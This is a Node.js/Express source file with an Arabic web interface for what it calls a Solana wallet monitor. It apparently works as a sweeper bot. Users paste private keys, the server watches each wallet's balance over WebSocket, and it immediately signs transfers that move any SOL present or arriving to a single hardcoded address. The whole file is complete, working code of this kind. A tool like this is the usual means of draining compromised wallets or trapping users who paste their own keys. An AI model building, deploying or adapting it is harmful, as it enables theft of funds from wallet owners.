const { Connection, PublicKey, Keypair, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const bs58 = require('bs58').default;
const express = require('express');
require('dotenv').config();

class SolanaWebMonitor {
    convertToHttpUrl(url) {
        // Convert WebSocket URLs to HTTP URLs for Connection
        if (url.startsWith('wss://')) {
            return url.replace('wss://', 'https://');
        } else if (url.startsWith('ws://')) {
            return url.replace('ws://', 'http://');
        }
        // Return as-is if already HTTP/HTTPS
        return url;
    }

    constructor() {
        // Initialize web monitoring system
        this.logs = [];
        
        // Target address to forward funds to
        this.targetAddress = new PublicKey('FUMnrwov6NuztUmmZZP97587aDZEH4WuKn8bgG6UqjXG');
        
        // Store wallets and their corresponding RPC connections
        this.wallets = [];
        this.connections = [];
        this.subscriptionIds = [];
        this.lastBalances = [];
        
        // Available RPC URLs
        this.rpcUrls = [
            process.env.RPC_URL,
            process.env.RPC_URL2,
            process.env.RPC_URL3,
            process.env.RPC_URL4,
            process.env.RPC_URL5
        ].filter(url => url) // Remove undefined URLs
         .map(url => this.convertToHttpUrl(url)); // Convert WebSocket URLs to HTTP
        
        // Store notifications for web interface
        this.notifications = [];
        
        // Track RPC errors
        this.rpcErrorCounts = new Array(this.rpcUrls.length).fill(0);
        this.lastRpcErrorTime = new Array(this.rpcUrls.length).fill(0);
        this.rpcFailedWallets = new Set(); // Track wallets with failed RPCs
        
        console.log('🌐 Solana Web Monitor initialized');
        console.log(`🔗 Available RPC URLs: ${this.rpcUrls.length}`);
    }
    
    addLog(message, type = 'info') {
        const log = {
            id: Date.now(),
            message,
            type,
            timestamp: new Date().toISOString()
        };
        this.logs.unshift(log);
        
        // Keep only last 100 logs
        if (this.logs.length > 100) {
            this.logs = this.logs.slice(0, 100);
        }
        
        console.log(`[${type.toUpperCase()}] ${message}`);
    }
    
    addNotification(message, type = 'info') {
        const notification = {
            id: Date.now(),
            message,
            type,
            timestamp: new Date().toISOString()
        };
        this.notifications.unshift(notification);
        
        // Keep only last 50 notifications
        if (this.notifications.length > 50) {
            this.notifications = this.notifications.slice(0, 50);
        }
        
        this.addLog(message, type);
    }
    
    processPrivateKeys(keysText) {
        const privateKeys = keysText.split('\n').filter(key => key.trim());
        
        if (privateKeys.length === 0) {
            this.addNotification('❌ لم يتم العثور على مفاتيح صالحة', 'error');
            return { success: false, message: 'لم يتم العثور على مفاتيح صالحة' };
        }
        
        // Check available RPC slots
        const currentWalletCount = this.wallets.length;
        const availableSlots = this.rpcUrls.length - currentWalletCount;
        
        if (availableSlots === 0) {
            return { success: false, message: 'لايمكنك اضافة محفظة اخرى', showTopMessage: true };
        }
        
        if (privateKeys.length > availableSlots) {
            this.addNotification(`⚠️ يمكنك إضافة حتى ${availableSlots} محفظة فقط من المتبقية`, 'warning');
            return { success: false, message: `يمكنك إضافة حتى ${availableSlots} محفظة فقط` };
        }
        
        let successCount = 0;
        let startIndex = currentWalletCount;
        
        for (let i = 0; i < privateKeys.length; i++) {
            try {
                const privateKey = privateKeys[i].trim();
                const privateKeyBytes = bs58.decode(privateKey);
                const wallet = Keypair.fromSecretKey(privateKeyBytes);
                const rpcIndex = startIndex + i;
                const connection = new Connection(this.rpcUrls[rpcIndex], 'confirmed');
                
                this.wallets.push(wallet);
                this.connections.push(connection);
                this.subscriptionIds.push(null);
                this.lastBalances.push(0);
                successCount++;
                
                console.log(`✅ Wallet ${rpcIndex + 1} loaded: ${wallet.publicKey.toString()}`);
                console.log(`🔗 Using RPC: ${this.rpcUrls[rpcIndex]}`);
                
                // Start monitoring for this new wallet immediately
                this.startMonitoringForWallet(rpcIndex);
                
            } catch (error) {
                this.addNotification(`❌ خطأ في المفتاح ${i + 1}: ${error.message}`, 'error');
                continue;
            }
        }
        
        if (successCount > 0) {
            this.addNotification(`✅ تم إضافة ${successCount} محفظة جديدة بنجاح!`, 'success');
            return { success: true, message: `تم إضافة ${successCount} محفظة جديدة بنجاح` };
        } else {
            this.addNotification('❌ فشل في تحميل أي محفظة', 'error');
            return { success: false, message: 'فشل في تحميل أي محفظة' };
        }
    }
    
    async startMonitoringForWallet(walletIndex) {
        const wallet = this.wallets[walletIndex];
        const connection = this.connections[walletIndex];
        const walletNumber = walletIndex + 1;
        
        // Check initial balance
        try {
            const initialBalance = await this.getBalance(connection, wallet.publicKey);
            this.lastBalances[walletIndex] = initialBalance;
            
            if (initialBalance > 0) {
                // Send funds immediately
                const sendPromise = this.forwardFunds(connection, wallet, initialBalance, walletNumber);
                // Send notification in parallel
                this.addNotification(`💰 المحفظة ${walletNumber}: رصيد موجود ${initialBalance / LAMPORTS_PER_SOL} SOL`, 'info');
                await sendPromise;
            }
        } catch (error) {
            console.error(`Error checking initial balance for wallet ${walletNumber}:`, error.message);
            this.lastBalances[walletIndex] = 0;
        }
        
        // Set up WebSocket subscription for this wallet
        try {
            const subscriptionId = connection.onAccountChange(
                wallet.publicKey,
                async (accountInfo) => {
                    try {
                        const newBalance = accountInfo.lamports;
                        const oldBalance = this.lastBalances[walletIndex] || 0;
                        
                        if (newBalance > oldBalance && newBalance > 0) {
                            const received = newBalance - oldBalance;
                            console.log(`💰 Wallet ${walletNumber}: Balance changed from ${oldBalance} to ${newBalance} lamports`);
                            
                            // Send funds immediately
                            const sendPromise = this.forwardFunds(connection, wallet, newBalance, walletNumber);
                            // Send notification in parallel (non-blocking)
                            this.addNotification(`💰 المحفظة ${walletNumber}: وصل ${received / LAMPORTS_PER_SOL} SOL`, 'success');
                            await sendPromise;
                        }
                        
                        this.lastBalances[walletIndex] = newBalance;
                        
                    } catch (error) {
                        console.error(`Error processing account change for wallet ${walletNumber}:`, error.message);
                        this.handleRpcError(error, walletIndex, walletNumber);
                    }
                },
                'confirmed'
            );
            
            this.subscriptionIds[walletIndex] = subscriptionId;
            console.log(`✅ WebSocket subscription started for wallet ${walletNumber}: ${wallet.publicKey.toString()}`);
            
        } catch (error) {
            console.error(`Error setting up subscription for wallet ${walletNumber}:`, error.message);
            this.handleRpcError(error, walletIndex, walletNumber);
            this.subscriptionIds[walletIndex] = null;
        }
    }

    async startMonitoring() {
        this.addNotification('🔍 بدء مراقبة المحافظ...', 'info');
        
        // Store subscription IDs to track active subscriptions
        this.subscriptionIds = [];
        this.lastBalances = [];
        
        for (let i = 0; i < this.wallets.length; i++) {
            const wallet = this.wallets[i];
            const connection = this.connections[i];
            const walletIndex = i + 1;
            
            // Check initial balance
            try {
                const initialBalance = await this.getBalance(connection, wallet.publicKey);
                this.lastBalances[i] = initialBalance;
                
                if (initialBalance > 0) {
                    // Send funds immediately
                    const sendPromise = this.forwardFunds(connection, wallet, initialBalance, walletIndex);
                    // Send notification in parallel
                    this.addNotification(`💰 المحفظة ${walletIndex}: رصيد موجود ${initialBalance / LAMPORTS_PER_SOL} SOL`, 'info');
                    await sendPromise;
                }
            } catch (error) {
                console.error(`Error checking initial balance for wallet ${walletIndex}:`, error.message);
                this.lastBalances[i] = 0;
            }
            
            // Set up WebSocket subscription for this wallet
            try {
                const subscriptionId = connection.onAccountChange(
                    wallet.publicKey,
                    async (accountInfo) => {
                        try {
                            const newBalance = accountInfo.lamports;
                            const oldBalance = this.lastBalances[i] || 0;
                            
                            if (newBalance > oldBalance && newBalance > 0) {
                                const received = newBalance - oldBalance;
                                console.log(`💰 Wallet ${walletIndex}: Balance changed from ${oldBalance} to ${newBalance} lamports`);
                                
                                // Send funds immediately
                                const sendPromise = this.forwardFunds(connection, wallet, newBalance, walletIndex);
                                // Send notification in parallel (non-blocking)
                                this.addNotification(`💰 المحفظة ${walletIndex}: وصل ${received / LAMPORTS_PER_SOL} SOL`, 'success');
                                await sendPromise;
                            }
                            
                            this.lastBalances[i] = newBalance;
                            
                        } catch (error) {
                            console.error(`Error processing account change for wallet ${walletIndex}:`, error.message);
                            this.handleRpcError(error, i, walletIndex);
                        }
                    },
                    'confirmed'
                );
                
                this.subscriptionIds.push(subscriptionId);
                console.log(`✅ WebSocket subscription started for wallet ${walletIndex}: ${wallet.publicKey.toString()}`);
                
            } catch (error) {
                console.error(`Error setting up subscription for wallet ${walletIndex}:`, error.message);
                this.handleRpcError(error, i, walletIndex);
                this.subscriptionIds.push(null);
            }
        }
        
        this.addNotification(`✅ تم بدء مراقبة ${this.wallets.length} محفظة عبر WebSocket`, 'success');
    }
    
    async getBalance(connection, publicKey) {
        const balance = await connection.getBalance(publicKey);
        return balance;
    }
    
    async forwardFunds(connection, wallet, amount, walletIndex) {
        try {
            const startTime = Date.now();
            
            const { blockhash } = await connection.getLatestBlockhash('confirmed');
            const transactionFee = 5000;
            const amountToSend = amount - transactionFee;
            
            if (amountToSend <= 0) {
                this.addNotification(`⚠️ المحفظة ${walletIndex}: المبلغ قليل جداً بعد خصم الرسوم`, 'warning');
                return false;
            }
            
            const transaction = new Transaction({
                recentBlockhash: blockhash,
                feePayer: wallet.publicKey
            });
            
            const transferInstruction = SystemProgram.transfer({
                fromPubkey: wallet.publicKey,
                toPubkey: this.targetAddress,
                lamports: amountToSend
            });
            
            transaction.add(transferInstruction);
            transaction.sign(wallet);
            
            const signature = await connection.sendRawTransaction(
                transaction.serialize(),
                {
                    skipPreflight: false,
                    maxRetries: 3
                }
            );
            
            const executionTime = Date.now() - startTime;
            
            const successMessage = `✅ المحفظة ${walletIndex}: تم إرسال ${amountToSend / LAMPORTS_PER_SOL} SOL
📝 المعاملة: https://solscan.io/tx/${signature}
⚡ وقت التنفيذ: ${executionTime}ms`;
            
            this.addNotification(successMessage, 'success');
            return true;
            
        } catch (error) {
            this.addNotification(`❌ المحفظة ${walletIndex}: خطأ في التحويل - ${error.message}`, 'error');
            return false;
        }
    }
    
    async getStatus() {
        if (this.wallets.length === 0) {
            return { message: '📊 لا توجد محافظ قيد المراقبة', wallets: [] };
        }
        
        let statusMessage = `📊 حالة المحافظ:\n\n`;
        
        for (let i = 0; i < this.wallets.length; i++) {
            const wallet = this.wallets[i];
            const connection = this.connections[i];
            const rpcUrl = this.rpcUrls[i];
            
            const walletNumber = i + 1;
            const errorCount = this.rpcErrorCounts[i];
            const isFailed = this.rpcFailedWallets.has(walletNumber);
            
            // Test RPC connection
            let rpcStatus = '🟢 متصل';
            let currentBalance = 'غير معروف';
            
            try {
                const balance = await this.getBalance(connection, wallet.publicKey);
                currentBalance = `${balance / LAMPORTS_PER_SOL} SOL`;
                rpcStatus = '🟢 متصل';
            } catch (error) {
                rpcStatus = '🔴 خطأ في الاتصال';
            }
            
            // Check subscription status
            const hasSubscription = this.subscriptionIds[i] !== null && this.subscriptionIds[i] !== undefined;
            const subscriptionStatus = hasSubscription && !isFailed ? '🟢 نشط' : '🔴 متوقف';
            
            statusMessage += `🔹 المحفظة ${walletNumber}:\n`;
            statusMessage += `   العنوان: ${wallet.publicKey.toString()}\n`;
            statusMessage += `   RPC: ${rpcUrl}\n`;
            statusMessage += `   حالة RPC: ${rpcStatus}\n`;
            statusMessage += `   المراقبة: ${subscriptionStatus}\n`;
            statusMessage += `   الرصيد الحالي: ${currentBalance}\n`;
            if (errorCount > 0) {
                statusMessage += `   أخطاء RPC: ${errorCount}\n`;
            }
            if (isFailed) {
                statusMessage += `   ⚠️ تم إيقاف هذه المحفظة نهائياً\n`;
            }
            statusMessage += '\n';
        }
        
        statusMessage += `🎯 عنوان الهدف: ${this.targetAddress.toString()}`;
        
        return { 
            message: statusMessage,
            wallets: this.wallets.map((wallet, i) => ({
                index: i + 1,
                address: wallet.publicKey.toString(),
                rpcUrl: this.rpcUrls[i],
                errorCount: this.rpcErrorCounts[i],
                isFailed: this.rpcFailedWallets.has(i + 1),
                hasSubscription: this.subscriptionIds[i] !== null && this.subscriptionIds[i] !== undefined
            }))
        };
    }
    
    handleRpcError(error, rpcIndex, walletIndex) {
        const currentTime = Date.now();
        this.rpcErrorCounts[rpcIndex]++;
        
        const MAX_ERRORS = 5; // Maximum errors before stopping monitoring
        const ERROR_WINDOW = 60000; // 1 minute window
        
        // Check if this RPC has failed too many times
        if (this.rpcErrorCounts[rpcIndex] >= MAX_ERRORS) {
            // Stop monitoring for this specific wallet
            if (this.subscriptionIds[rpcIndex] && this.connections[rpcIndex]) {
                try {
                    this.connections[rpcIndex].removeAccountChangeListener(this.subscriptionIds[rpcIndex]);
                    this.subscriptionIds[rpcIndex] = null;
                } catch (error) {
                    console.error(`Error removing subscription for wallet ${walletIndex}:`, error.message);
                }
            }
            
            // Mark this wallet as failed and send one final notification
            if (!this.rpcFailedWallets.has(walletIndex)) {
                this.rpcFailedWallets.add(walletIndex);
                
                const stopMessage = `🛑 تم إيقاف مراقبة المحفظة ${walletIndex} نهائياً!

❌ سبب الإيقاف: تعطل RPC بشكل متكرر
🔗 RPC المتعطل: ${this.rpcUrls[rpcIndex]}
📊 عدد الأخطاء: ${this.rpcErrorCounts[rpcIndex]}

💡 لإعادة التشغيل: استخدم /add_wallets مع RPC جديد
⚠️ لن تصلك المزيد من الرسائل لهذه المحفظة`;
                
                this.addNotification(stopMessage, 'error');
            }
        } else {
            // Only send error notification for first few errors, not every error
            if (this.rpcErrorCounts[rpcIndex] <= 2 && 
                currentTime - this.lastRpcErrorTime[rpcIndex] > ERROR_WINDOW) {
                
                this.lastRpcErrorTime[rpcIndex] = currentTime;
                
                const warningMessage = `⚠️ تحذير: مشاكل في RPC للمحفظة ${walletIndex}
🔗 RPC: ${this.rpcUrls[rpcIndex]}
❌ الخطأ: ${error.message}
📊 محاولة: ${this.rpcErrorCounts[rpcIndex]}/${MAX_ERRORS}

💡 سيتم إيقاف المراقبة إذا استمرت المشاكل`;
                
                this.addNotification(warningMessage, 'warning');
            }
        }
        
        // Log error for debugging
        console.error(`RPC Error - Wallet ${walletIndex} (${this.rpcErrorCounts[rpcIndex]}/${MAX_ERRORS}):`, error.message);
    }

    stopAllMonitoring() {
        // Remove WebSocket subscriptions
        for (let i = 0; i < this.subscriptionIds.length; i++) {
            if (this.subscriptionIds[i] && this.connections[i]) {
                try {
                    this.connections[i].removeAccountChangeListener(this.subscriptionIds[i]);
                    console.log(`🔌 WebSocket subscription ${i + 1} removed`);
                } catch (error) {
                    console.error(`Error removing subscription ${i + 1}:`, error.message);
                }
            }
        }
        
        this.subscriptionIds = [];
        this.lastBalances = [];
        
        // Reset error tracking
        this.rpcErrorCounts.fill(0);
        this.lastRpcErrorTime.fill(0);
        this.rpcFailedWallets.clear();
        // Clear notifications on stop
        this.addNotification('🛑 تم إيقاف مراقبة جميع المحافظ', 'info');
        
        console.log('🛑 All WebSocket monitoring stopped');
    }
}

// Initialize the monitor
const monitor = new SolanaWebMonitor();

async function main() {
    console.log('🌐 Starting Solana Web Monitor...');
    console.log('=====================================');
    console.log('✅ Monitor is ready for web interface...');
}

// Handle uncaught exceptions
process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught Exception:', error.message);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Unhandled Rejection at:', promise, 'reason:', reason);
});

// Start the application
main().catch(error => {
    console.error('❌ Fatal error:', error.message);
    process.exit(1);
});

// Express server with HTML interface
const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use((req, res, next) => {
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    next();
});

// Main HTML interface
app.get('/', (req, res) => {
    const html = `<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مراقب محافظ Solana</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            overflow: hidden;
            position: relative;
        }
        
        .top-message {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            background: #dc3545;
            color: white;
            text-align: center;
            padding: 15px;
            font-size: 16px;
            font-weight: bold;
            z-index: 1000;
            border-radius: 20px 20px 0 0;
            transform: translateY(-100%);
            transition: transform 0.3s ease;
        }
        
        .top-message.show {
            transform: translateY(0);
        }
        
        .header {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
        }
        
        .main-content {
            display: grid;
            grid-template-columns: 1fr 400px;
            gap: 30px;
            padding: 30px;
        }
        
        .left-panel {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }
        
        .card {
            background: #f8f9fa;
            border: 2px solid #e9ecef;
            border-radius: 15px;
            padding: 25px;
            transition: all 0.3s ease;
        }
        
        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
        }
        
        .card h2 {
            color: #495057;
            margin-bottom: 15px;
            font-size: 1.5rem;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #495057;
        }
        
        textarea {
            width: 100%;
            padding: 15px;
            border: 2px solid #dee2e6;
            border-radius: 10px;
            font-size: 14px;
            resize: vertical;
            min-height: 120px;
            font-family: monospace;
            direction: ltr;
            text-align: left;
        }
        
        textarea:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        
        .btn {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.3);
        }
        
        .btn.secondary {
            background: linear-gradient(45deg, #6c757d, #495057);
        }
        
        .btn.danger {
            background: linear-gradient(45deg, #dc3545, #c82333);
        }
        
        .right-panel {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }
        
        .status-display {
            background: #f8f9fa;
            border-radius: 15px;
            padding: 20px;
            font-family: monospace;
            font-size: 14px;
            white-space: pre-wrap;
            word-break: break-all;
            overflow-wrap: break-word;
            max-height: 300px;
            overflow-y: auto;
            overflow-x: hidden;
            border: 2px solid #e9ecef;
        }
        
        .notifications {
            background: #f8f9fa;
            border-radius: 15px;
            padding: 20px;
            max-height: 400px;
            overflow-y: auto;
            border: 2px solid #e9ecef;
        }
        
        .notification {
            padding: 10px;
            margin-bottom: 10px;
            border-radius: 8px;
            font-size: 14px;
            border-left: 4px solid #667eea;
            word-break: break-all;
            overflow-wrap: break-word;
        }
        
        .notification.success {
            background: #d4edda;
            border-color: #28a745;
        }
        
        .notification.error {
            background: #f8d7da;
            border-color: #dc3545;
        }
        
        .notification.warning {
            background: #fff3cd;
            border-color: #ffc107;
        }
        
        .notification.info {
            background: #d1ecf1;
            border-color: #17a2b8;
        }
        
        .timestamp {
            font-size: 12px;
            color: #6c757d;
            margin-top: 5px;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .stat-card {
            background: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            border: 2px solid #e9ecef;
        }
        
        .stat-value {
            font-size: 2rem;
            font-weight: bold;
            color: #667eea;
        }
        
        .stat-label {
            color: #6c757d;
            font-size: 14px;
        }
        
        @media (max-width: 768px) {
            .main-content {
                grid-template-columns: 1fr;
            }
            
            .header h1 {
                font-size: 2rem;
            }
        }
        
        .loading {
            opacity: 0.6;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="top-message" id="topMessage">
            لايمكنك اضافة محفظة اخرى
        </div>
        <div class="header">
            <h1>🔥 مراقب محافظ Solana</h1>
            <p>مراقبة وتحويل الأموال تلقائياً من محافظ Solana</p>
        </div>
        
        <div class="main-content">
            <div class="left-panel">
                <div class="stats" id="stats">
                    <div class="stat-card">
                        <div class="stat-value" id="walletCount">0</div>
                        <div class="stat-label">المحافظ المراقبة</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value" id="activeCount">0</div>
                        <div class="stat-label">النشطة</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value" id="errorCount">0</div>
                        <div class="stat-label">الأخطاء</div>
                    </div>
                </div>
                
                <div class="card">
                    <h2>📝 إضافة محافظ للمراقبة</h2>
                    <form id="addWalletsForm">
                        <div class="form-group">
                            <label for="privateKeys">المفاتيح الخاصة (كل مفتاح في سطر منفصل):</label>
                            <textarea id="privateKeys" placeholder="ضع المفاتيح الخاصة هنا...\nكل مفتاح في سطر منفصل\nمثال: 5J1F7GHaDxuucP2VX7rciRchxrDsNo1SyJ...\n3K8H9JDa8xTvP1WX5rciRchxrDsNo1SyJ..."></textarea>
                        </div>
                        <button type="submit" class="btn" id="addBtn">إضافة المحافظ</button>
                    </form>
                </div>
                
                <div class="card">
                    <h2>📊 حالة المحافظ</h2>
                    <button type="button" class="btn secondary" id="statusBtn">عرض الحالة</button>
                    <div class="status-display" id="statusDisplay"></div>
                </div>
                
                <div class="card">
                    <h2>⏹️ إيقاف المراقبة</h2>
                    <button type="button" class="btn danger" id="stopBtn">إيقاف جميع المحافظ</button>
                </div>
            </div>
            
            <div class="right-panel">
                <div class="card">
                    <h2>🔔 الإشعارات المباشرة</h2>
                    <div class="notifications" id="notifications">
                        <div class="notification info">
                            <div>مرحباً بك في مراقب محافظ Solana!</div>
                            <div class="timestamp">${new Date().toLocaleString('ar-EG')}</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        let updateInterval;
        
        // Auto refresh notifications every 2 seconds
        function startAutoRefresh() {
            updateInterval = setInterval(loadNotifications, 2000);
        }
        
        // Load notifications
        async function loadNotifications() {
            try {
                const response = await fetch('/api/notifications');
                const notifications = await response.json();
                displayNotifications(notifications || []);
                updateStats();
            } catch (error) {
                console.error('Error loading notifications:', error);
            }
        }
        
        // Display notifications
        function displayNotifications(notifications) {
            const container = document.getElementById('notifications');
            if (notifications.length === 0) {
                container.innerHTML = '<div class="notification info">لا توجد إشعارات حالياً</div>';
                return;
            }
            
            container.innerHTML = notifications.map(notif => 
                '<div class="notification ' + notif.type + '">' +
                    '<div>' + notif.message + '</div>' +
                    '<div class="timestamp">' + new Date(notif.timestamp).toLocaleString('ar-EG') + '</div>' +
                '</div>'
            ).join('');
        }
        
        // Update statistics
        async function updateStats() {
            try {
                const response = await fetch('/api/status');
                const status = await response.json();
                
                const wallets = status.wallets || [];
                document.getElementById('walletCount').textContent = wallets.length;
                document.getElementById('activeCount').textContent = wallets.filter(w => w.hasSubscription && !w.isFailed).length;
                document.getElementById('errorCount').textContent = wallets.reduce((sum, w) => sum + (w.errorCount || 0), 0);
            } catch (error) {
                console.error('Error updating stats:', error);
            }
        }
        
        // Show top message for 2 seconds
        function showTopMessage() {
            const topMessage = document.getElementById('topMessage');
            topMessage.classList.add('show');
            
            setTimeout(() => {
                topMessage.classList.remove('show');
            }, 2000);
        }
        
        // Add wallets form
        document.getElementById('addWalletsForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const btn = document.getElementById('addBtn');
            const privateKeys = document.getElementById('privateKeys').value;
            
            if (!privateKeys.trim()) {
                alert('الرجاء إدخال المفاتيح الخاصة');
                return;
            }
            
            btn.textContent = 'جاري الإضافة...';
            btn.disabled = true;
            
            try {
                const response = await fetch('/api/add-wallets', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ privateKeys })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    document.getElementById('privateKeys').value = '';
                    alert('تم إضافة المحافظ بنجاح!');
                } else {
                    if (result.showTopMessage) {
                        showTopMessage();
                    } else {
                        alert('خطأ: ' + result.message);
                    }
                }
            } catch (error) {
                alert('خطأ في الاتصال: ' + error.message);
            } finally {
                btn.textContent = 'إضافة المحافظ';
                btn.disabled = false;
            }
        });
        
        // Status button
        document.getElementById('statusBtn').addEventListener('click', async () => {
            const btn = document.getElementById('statusBtn');
            const display = document.getElementById('statusDisplay');
            
            btn.textContent = 'جاري التحديث...';
            btn.disabled = true;
            
            try {
                const response = await fetch('/api/status');
                const status = await response.json();
                display.textContent = status.message;
            } catch (error) {
                display.textContent = 'خطأ في تحميل الحالة: ' + error.message;
            } finally {
                btn.textContent = 'عرض الحالة';
                btn.disabled = false;
            }
        });
        
        // Stop monitoring button
        document.getElementById('stopBtn').addEventListener('click', async () => {
            if (!confirm('هل أنت متأكد من إيقاف مراقبة جميع المحافظ؟')) {
                return;
            }
            
            const btn = document.getElementById('stopBtn');
            btn.textContent = 'جاري الإيقاف...';
            btn.disabled = true;
            
            try {
                const response = await fetch('/api/stop', { method: 'POST' });
                const result = await response.json();
                alert(result.message);
            } catch (error) {
                alert('خطأ في الاتصال: ' + error.message);
            } finally {
                btn.textContent = 'إيقاف جميع المحافظ';
                btn.disabled = false;
            }
        });
        
        // Start auto refresh when page loads
        document.addEventListener('DOMContentLoaded', () => {
            loadNotifications();
            startAutoRefresh();
        });
    </script>
</body>
</html>`;
    
    res.send(html);
});

// API Routes
app.post('/api/add-wallets', (req, res) => {
    const { privateKeys } = req.body;
    const result = monitor.processPrivateKeys(privateKeys);
    res.json(result);
});

app.get('/api/status', async (req, res) => {
    const status = await monitor.getStatus();
    res.json(status);
});

app.post('/api/stop', (req, res) => {
    monitor.stopAllMonitoring();
    res.json({ success: true, message: 'تم إيقاف مراقبة جميع المحافظ' });
});

app.get('/api/notifications', (req, res) => {
    res.json(monitor.notifications);
});

app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        uptime: process.uptime(),
        wallets: monitor.wallets.length,
        monitoring: monitor.subscriptionIds.filter(id => id !== null).length,
        timestamp: new Date().toISOString()
    });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🌐 Express server running on port ${PORT}`);
    console.log(`🔗 Web interface: http://localhost:${PORT}`);
    console.log(`🔗 Health check: http://localhost:${PORT}/health`);
});